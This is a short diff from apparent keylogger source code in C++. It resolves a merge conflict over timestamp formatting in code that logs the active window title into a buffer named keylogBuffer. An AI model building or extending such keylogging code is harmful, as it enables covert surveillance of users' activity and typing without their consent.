@@ -37,14 +37,9 @@ namespace capture {
                     lastTitle = currentTitle;
                     
                     time_t now = time(0);
-<<<<<<< HEAD
                     char dt[26];
                     ctime_s(dt, sizeof(dt), &now);
                     std::string timestamp = dt;
-=======
-                    char* dt = ctime(&now);
-                    std::string timestamp = dt ? dt : "";
->>>>>>> 68f7affb5880fa8c91159abe3758b8e0be161009
                     if (!timestamp.empty() && timestamp.back() == '\n') timestamp.pop_back();
 
                     keylogBuffer += "\n\n--- [Active Window: " + currentTitle + " at " + timestamp + "] ---\n";
